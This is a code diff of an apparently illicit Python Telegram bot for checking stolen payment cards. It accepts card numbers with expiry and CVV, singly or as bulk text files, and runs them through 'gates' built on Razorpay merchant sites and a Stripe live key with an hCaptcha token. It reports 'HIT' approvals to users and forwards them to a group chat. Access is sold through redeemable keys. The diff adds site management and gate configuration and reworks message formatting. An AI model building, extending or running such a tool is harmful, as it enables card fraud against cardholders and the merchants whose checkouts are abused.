+            send_message(chat_id, f"<b>User not found.</b>\n\n<code>{target_id}</code> is not authorized.\n\n<i>{DEVELOPER}</i>")
         return
 
     # --- /authlist ---
     if text == "/authlist":
         if not is_admin(user_id):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
+            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         users = load_users()
         if not users:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo authorized users.")
+            send_message(chat_id, f"<b>No authorized users.</b>\n\n<i>{DEVELOPER}</i>")
             return
         lines_out = []
         now = time.time()
@@ -2345,18 +2569,19 @@ def handle_update(update):
                 exp = fmt_duration(remaining) + " left"
             lines_out.append(f"  {uid}  ·  {key[:10]}...  ·  {exp}")
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Authorized Users ({len(users)})</b> ⌁━━━⍟\n\n"
-            "<code>" + "\n".join(lines_out) + "</code>")
+            f"<b>Authorized Users ({len(users)})</b>\n\n"
+            "<code>" + "\n".join(lines_out) + "</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /broadcast ---
     if text.startswith("/broadcast"):
         if not is_admin(user_id):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
+            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> /broadcast Your message")
+            send_message(chat_id, f"<b>Usage:</b> /broadcast Your message here\n\n<i>{DEVELOPER}</i>")
             return
         broadcast_text = parts[1]
         users = load_users()
@@ -2364,7 +2589,7 @@ def handle_update(update):
         failed = 0
         for uid in users:
             try:
-                resp = send_message(int(uid), f"⍟━━━⌁ <b>Broadcast</b> ⌁━━━⍟\n\n{broadcast_text}")
+                resp = send_message(int(uid), f"<b>Broadcast</b>\n\n{broadcast_text}\n\n<i>{DEVELOPER}</i>")
                 if resp.get("ok"):
                     sent += 1
                 else:
@@ -2372,23 +2597,25 @@ def handle_update(update):
             except Exception:
                 failed += 1
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Broadcast Complete</b> ⌁━━━⍟\n\n"
-            f"Sent: <code>{sent}</code>\nFailed: <code>{failed}</code>")
+            f"<b>Broadcast Complete</b>\n\n"
+            f"Sent: <code>{sent}</code>\n"
+            f"Failed: <code>{failed}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /redeem ---
     if text.startswith("/redeem"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/redeem YOUR-KEY</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/redeem YOUR-KEY</code>\n\n<i>{DEVELOPER}</i>")
             return
         key = parts[1].strip()
         keys = load_keys()
         if key not in keys:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid key.")
+            send_message(chat_id, f"<b>Invalid key.</b>\n\n<i>{DEVELOPER}</i>")
             return
         if keys[key].get("used"):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nKey already used.")
+            send_message(chat_id, f"<b>Key already used.</b>\n\n<i>{DEVELOPER}</i>")
             return
         keys[key]["used"] = True
         keys[key]["used_by"] = user_id
@@ -2399,12 +2626,171 @@ def handle_update(update):
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
         limit_label = str(line_limit) if line_limit else "Unlimited"
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Access Granted</b> ⌁━━━⍟\n\n"
-            f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>\n\nWelcome aboard.")
+            f"<b>Access Granted</b>\n\n"
+            f"Duration: <code>{dur_label}</code>\n"
+            f"Line Limit: <code>{limit_label}</code>\n\n"
+            f"Welcome aboard.\n\n"
+            f"<i>{DEVELOPER}</i>")
+
+        # Notify GC about new user
         notify_new_user(user_id, username, f"Duration: {dur_label} | Limit: {limit_label}")
         return
 
-    # --- /authsite (admin) ---
+    # --- /rpaysite (manage Razorpay sites for /rpay) ---
+    if text.startswith("/rpaysite"):
+        if not is_admin(user_id):
+            sites = load_rpay_sites()
+            send_message(chat_id,
+                f"<b>Razorpay Sites</b>\n\n"
+                f"Loaded: <code>{len(sites)}</code> site(s)\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+
+        parts = text.split(maxsplit=1)
+        new_sites_raw = []
+
+        reply = msg.get("reply_to_message")
+        if reply and reply.get("document"):
+            doc = reply["document"]
+            fname = doc.get("file_name", "")
+            if fname.lower().endswith(".txt"):
+                content = download_file(doc["file_id"])
+                if content:
+                    new_sites_raw = [l.strip() for l in content.splitlines()
+                                     if l.strip() and not l.strip().startswith('#')]
+
+        if len(parts) >= 2:
+            sub = parts[1].strip()
+
+            if sub.lower() == "list":
+                sites = load_rpay_sites()
+                if not sites:
+                    send_message(chat_id,
+                        "<b>RPay Sites — Empty</b>\n\n"
+                        "No sites added yet.\n"
+                        "Use <code>/rpaysite URL</code> to add.\n\n"
+                        f"<i>{DEVELOPER}</i>")
+                else:
+                    lines_out = []
+                    for i, s in enumerate(sites[:30], 1):
+                        masked = s[:40] + "..." if len(s) > 40 else s
+                        lines_out.append(f"  {i}. <code>{masked}</code>")
+                    extra = f"\n... and {len(sites) - 30} more" if len(sites) > 30 else ""
+                    send_message(chat_id,
+                        f"<b>RPay Sites ({len(sites)})</b>\n\n"
+                        + "\n".join(lines_out) + extra +
+                        f"\n\n<i>{DEVELOPER}</i>")
+                return
+
+            if sub.lower() == "clear":
+                save_rpay_sites([])
+                send_message(chat_id,
+                    "<b>RPay Sites Cleared</b>\n\n"
+                    f"All sites removed.\n\n<i>{DEVELOPER}</i>")
+                return
+
+            if sub.lower().startswith("remove "):
+                remove_url = sub[7:].strip()
+                sites = load_rpay_sites()
+                new_sites = [s for s in sites if s.lower() != remove_url.lower()
+                             and s.lower().replace('https://', '').replace('http://', '').rstrip('/')
+                             != remove_url.lower().replace('https://', '').replace('http://', '').rstrip('/')]
+                removed = len(sites) - len(new_sites)
+                save_rpay_sites(new_sites)
+                send_message(chat_id,
+                    f"<b>Removed {removed} site(s)</b>\n\n"
+                    f"Remaining: <code>{len(new_sites)}</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
+                return
+
+            inline_sites = [l.strip() for l in sub.splitlines() if l.strip() and not l.strip().startswith('#')]
+            expanded = []
+            for s in inline_sites:
+                if ',' in s:
+                    expanded.extend([x.strip() for x in s.split(',') if x.strip()])
+                else:
+                    expanded.append(s)
+            new_sites_raw.extend(expanded)
+
+        if not new_sites_raw:
+            sites = load_rpay_sites()
+            send_message(chat_id,
+                "<b>RPay Site Management</b>\n\n"
+                f"Current sites: <code>{len(sites)}</code>\n\n"
+                "<b>Add sites:</b>\n"
+                "<code>/rpaysite https://razorpay.me/@merchant</code>\n\n"
+                "<b>Multiple sites:</b>\n"
+                "<code>/rpaysite\n"
+                "https://site1.com\n"
+                "https://site2.com</code>\n\n"
+                "<b>From file:</b>\n"
+                "Reply to a .txt file with <code>/rpaysite</code>\n\n"
+                "<b>Other commands:</b>\n"
+                "<code>/rpaysite list</code>  ·  List all sites\n"
+                "<code>/rpaysite clear</code>  ·  Remove all\n"
+                "<code>/rpaysite remove URL</code>  ·  Remove one\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+
+        send_message(chat_id,
+            f"<b>Validating {len(new_sites_raw)} site(s)...</b>\n"
+            "Checking Razorpay compatibility...")
+
+        def _do_validate_rpay():
+            existing = load_rpay_sites()
+            existing_normalized = set(
+                s.lower().replace('https://', '').replace('http://', '').rstrip('/')
+                for s in existing
+            )
+            valid = []
+            invalid = []
+            duplicate = []
+            results_lines = []
+
+            for raw_site in new_sites_raw:
+                site_url = raw_site.strip()
+                if not site_url.startswith(('http://', 'https://')):
+                    site_url = 'https://' + site_url
+                site_url = site_url.rstrip('/')
+
+                normalized = site_url.lower().replace('https://', '').replace('http://', '').rstrip('/')
+
+                if normalized in existing_normalized:
+                    duplicate.append(site_url)
+                    masked = site_url[:40] + "..." if len(site_url) > 40 else site_url
+                    results_lines.append(f"⚠️ <code>{masked}</code> — Already added")
+                    continue
+
+                is_valid, detail = rpay_validate_site(site_url)
+                masked = site_url[:40] + "..." if len(site_url) > 40 else site_url
+
+                if is_valid:
+                    valid.append(site_url)
+                    existing_normalized.add(normalized)
+                    results_lines.append(f"✅ <code>{masked}</code> — {detail}")
+                else:
+                    invalid.append(site_url)
+                    results_lines.append(f"❌ <code>{masked}</code> — {detail}")
+
+            if valid:
+                existing.extend(valid)
+                save_rpay_sites(existing)
+
+            send_message(chat_id,
+                f"<b>RPay Site Results</b>\n\n"
+                f"Submitted: <code>{len(new_sites_raw)}</code>\n"
+                f"✅ Added: <code>{len(valid)}</code>\n"
+                f"❌ Invalid: <code>{len(invalid)}</code>\n"
+                f"⚠️ Duplicate: <code>{len(duplicate)}</code>\n"
+                f"Total sites: <code>{len(existing)}</code>\n\n"
+                + "\n".join(results_lines[:20]) +
+                (f"\n... and {len(results_lines) - 20} more" if len(results_lines) > 20 else "") +
+                f"\n\n<i>{DEVELOPER}</i>")
+
+        threading.Thread(target=_do_validate_rpay, daemon=True).start()
+        return
+
+    # --- /authsite (admin — set /auth gate site URL) ---
     if text.startswith("/authsite"):
         if not is_admin(user_id):
             return
@@ -2412,16 +2798,56 @@ def handle_update(update):
         if len(parts) < 2:
             cfg = auth_get_config()
             send_message(chat_id,
-                f"⍟━━━⌁ <b>Auth Gate Site</b> ⌁━━━⍟\n\n"
+                "<b>Auth Gate Site</b>\n\n"
                 f"Current: <code>{cfg.get('site_url', 'N/A')}</code>\n\n"
-                f"<code>/authsite https://newsite.com</code>")
+                "<b>Change:</b> <code>/authsite https://newsite.com</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
         new_url = parts[1].strip().rstrip('/')
         if not new_url.startswith(('http://', 'https://')):
             new_url = 'https://' + new_url
         auth_update_config("site_url", new_url)
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Auth Site Updated</b> ⌁━━━⍟\n\nNew URL: <code>{new_url}</code>")
+            f"<b>Auth Site Updated</b>\n\n"
+            f"New URL: <code>{new_url}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
+        return
+
+    # --- /chr1config (admin — configure /chr1 gate) ---
+    if text.startswith("/chr1config"):
+        if not is_admin(user_id):
+            return
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            cfg = chr1_get_config()
+            send_message(chat_id,
+                "<b>CHR1 Gate Config</b>\n\n"
+                f"Site: <code>{cfg.get('site_url', 'N/A')}</code>\n"
+                f"Stripe PK: <code>{cfg.get('stripe_pk', 'N/A')[:30]}...</code>\n"
+                f"Amount: <code>{cfg.get('amount', '5.00')}</code>\n\n"
+                "<b>Update:</b>\n"
+                "<code>/chr1config site https://newsite.com</code>\n"
+                "<code>/chr1config pk pk_live_xxx</code>\n"
+                "<code>/chr1config token HCAPTCHA_TOKEN</code>\n"
+                "<code>/chr1config amount 10.00</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+        sub = parts[1].strip()
+        sub_parts = sub.split(maxsplit=1)
+        if len(sub_parts) < 2:
+            send_message(chat_id, f"<b>Usage:</b> <code>/chr1config site|pk|token|amount VALUE</code>\n\n<i>{DEVELOPER}</i>")
+            return
+        key_name, value = sub_parts[0].lower(), sub_parts[1].strip()
+        key_map = {"site": "site_url", "pk": "stripe_pk", "token": "hcaptcha_token", "amount": "amount"}
+        if key_name not in key_map:
+            send_message(chat_id, f"<b>Unknown key.</b> Use: site, pk, token, amount\n\n<i>{DEVELOPER}</i>")
+            return
+        chr1_update_config(key_map[key_name], value)
+        send_message(chat_id,
+            f"<b>CHR1 Config Updated</b>\n\n"
+            f"Key: <code>{key_name}</code>\n"
+            f"Value: <code>{value[:40]}{'...' if len(value) > 40 else ''}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- Gate commands ---
@@ -2431,16 +2857,15 @@ def handle_update(update):
 
         if not is_gate_enabled(gate):
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{gate_label} — Offline</b> ⌁━━━⍟\n\n"
-                f"This gate is disabled. Try /gates for available options.")
+                f"<b>{gate_label} — Offline</b>\n\n"
+                f"This gate has been disabled by an admin.\n"
+                f"Try another gate or check /gates for available options.\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
             return
-
-        # Determine gate type for hit format
-        is_charge = gate in [g[0] for g in CHARGE_GATES]
 
         # Single card mode
         parts = text.split(maxsplit=1)
@@ -2448,31 +2873,33 @@ def handle_update(update):
             cc_input = parts[1].strip()
             c_data = cc_input.split('|')
             if len(c_data) != 4:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid format. Use: <code>{cmd_base} CC|MM|YY|CVV</code>")
+                send_message(chat_id, f"<b>Invalid format.</b>\n\nUse: <code>{cmd_base} CC|MM|YY|CVV</code>\n\n<i>{DEVELOPER}</i>")
                 return
 
-            send_message(chat_id, f"⍟━━━⌁ <b>Checking...</b> ⌁━━━⍟\n<code>{cc_input}</code>")
+            send_message(chat_id, f"<b>Checking...</b>\n<code>{cc_input}</code>")
 
             def _single_check():
-                result = process_single_entry(cc_input, list(_global_proxies) if _global_proxies else [], user_id, gate=gate)
+                result = process_single_entry(cc_input, [], user_id, gate=gate)
                 r_lower = result.lower()
-                if r_lower.startswith("approved") or "approved" in r_lower:
-                    # Use Hijra hit format
-                    hit_msg = _fmt_hit_notification(user_id, username, gate_label, cc_input, result)
-                    send_message(chat_id, hit_msg)
-                    notify_hit(user_id, username, gate_label, cc_input, result)
+                if r_lower.startswith("approved") or r_lower.startswith("charged"):
+                    status = "APPROVED"
                 elif "skipped" in r_lower:
-                    send_message(chat_id,
-                        f"⍟━━━⌁ <b>SKIPPED</b> ⌁━━━⍟\n\n"
-                        f"Card: <code>{cc_input}</code>\n"
-                        f"Gate: <code>{gate_label}</code>\n"
-                        f"Result: {result}")
+                    status = "SKIPPED"
+                elif "error" in r_lower:
+                    status = "ERROR"
                 else:
-                    send_message(chat_id,
-                        f"⍟━━━⌁ <b>DECLINED</b> ⌁━━━⍟\n\n"
-                        f"Card: <code>{cc_input}</code>\n"
-                        f"Gate: <code>{gate_label}</code>\n"
-                        f"Result: {result}")
+                    status = "DECLINED"
+
+                send_message(chat_id,
+                    f"<b>{status}</b>\n\n"
+                    f"Card: <code>{cc_input}</code>\n"
+                    f"Gate: <code>{gate_label}</code>\n"
+                    f"Result: {result}\n\n"
+                    f"<i>{DEVELOPER}</i>")
+
+                # Notify GC on hit
+                if status == "APPROVED":
+                    notify_hit(user_id, username, gate_label, cc_input, result)
 
             threading.Thread(target=_single_check, daemon=True).start()
             return
@@ -2481,20 +2908,21 @@ def handle_update(update):
         reply = msg.get("reply_to_message")
         if not reply or not reply.get("document"):
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
+                f"<b>Usage</b>\n\n"
                 f"<b>Single:</b> <code>{cmd_base} CC|MM|YY|CVV</code>\n"
-                f"<b>Bulk:</b> Reply to a .txt with <code>{cmd_base}</code>")
+                f"<b>Bulk:</b> Reply to a .txt file with <code>{cmd_base}</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
         doc = reply["document"]
         fname = doc.get("file_name", "")
         if not fname.lower().endswith(".txt"):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOnly .txt files accepted.")
+            send_message(chat_id, f"<b>Only .txt files are accepted.</b>\n\n<i>{DEVELOPER}</i>")
             return
 
         with active_lock:
             if user_id in active_users:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
+                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                 return
             active_users.add(user_id)
 
@@ -2504,14 +2932,14 @@ def handle_update(update):
         if not content:
             with active_lock:
                 active_users.discard(user_id)
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to download file.")
+            send_message(chat_id, f"<b>Failed to download file.</b>\n\n<i>{DEVELOPER}</i>")
             return
 
         file_lines = [l.strip() for l in content.splitlines() if l.strip()]
         if not file_lines:
             with active_lock:
                 active_users.discard(user_id)
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFile is empty.")
+            send_message(chat_id, f"<b>File is empty.</b>\n\n<i>{DEVELOPER}</i>")
             return
 
         user_limit = get_user_line_limit(user_id)
@@ -2519,13 +2947,15 @@ def handle_update(update):
             with active_lock:
                 active_users.discard(user_id)
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
-                f"Your key allows <code>{user_limit}</code> lines. File has <code>{len(file_lines)}</code>.")
+                f"<b>File Too Large</b>\n\n"
+                f"Your key allows <code>{user_limit}</code> lines.\n"
+                f"Your file has <code>{len(file_lines)}</code> lines.\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
         init_resp = send_message(
             chat_id,
-            f"⍟━━━⌁ <b>{gate_label}</b> ⌁━━━⍟\n\nStarting...",
+            f"Starting — <b>{gate_label}</b>...",
             reply_markup=stop_button_markup(user_id)
         )
         progress_msg_id = init_resp.get("result", {}).get("message_id")
@@ -2537,16 +2967,22 @@ def handle_update(update):
             def on_progress(idx, total, results, entry, status, detail):
                 if status == "APPROVED":
                     status_text = "APPROVED — " + detail
-                    hit_msg = _fmt_hit_notification(user_id, username, gate_label, entry,
-                                                    detail)
-                    send_message(chat_id, hit_msg)
-                    notify_hit(user_id, username, gate_label, entry, detail)
                 elif status == "DECLINED":
                     status_text = "DECLINED — " + detail
                 elif status == "SKIPPED":
                     status_text = "SKIPPED — " + detail
                 else:
                     status_text = "ERROR — " + detail
+
+                if status == "APPROVED":
+                    send_message(chat_id,
+                        f"<b>HIT</b>\n\n"
+                        f"<code>{entry}</code>\n\n"
+                        f"{detail}\n"
+                        f"[{idx}/{total}]\n\n"
+                        f"<i>{DEVELOPER}</i>")
+                    # Notify GC
+                    notify_hit(user_id, username, gate_label, entry, detail)
 
                 now = time.time()
                 if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
@@ -2593,7 +3029,7 @@ def handle_update(update):
 #  Polling loop
 # ============================================================
 def main():
-    print(f"[Bot] Starting — {BOT_NAME}")
+    print(f"[Bot] Starting — {DEVELOPER}")
     load_global_proxies()
     print(f"[Bot] Polling for updates...")
 
